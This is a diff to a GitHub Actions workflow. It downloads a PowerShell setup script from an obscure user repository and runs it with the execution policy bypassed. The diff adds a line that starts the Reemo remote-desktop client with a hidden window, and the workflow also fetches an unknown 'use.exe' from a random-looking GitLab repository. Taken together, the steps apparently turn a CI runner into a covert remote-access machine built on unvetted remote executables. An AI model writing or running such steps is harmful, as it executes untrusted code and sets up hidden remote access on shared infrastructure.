@@ -10,11 +10,12 @@ jobs:
     steps:
     - name: Download
       run: |
-          curl -s -L -o setup.ps1 https://github.com/398103481wdawd/ReemoRDP/raw/refs/heads/main/setup.ps1
+          curl -s -L -o setup.ps1 https://raw.githubusercontent.com/398103481wdawd/ReemoRDP/refs/heads/main/setup.ps1
     
     - name: run
       run: |
            powershell -ExecutionPolicy Bypass -File "setup.ps1"
+           Start-Process "C:\Program Files\Reemo\Reemo.exe" -WindowStyle Hidden
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
            sleep 240
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
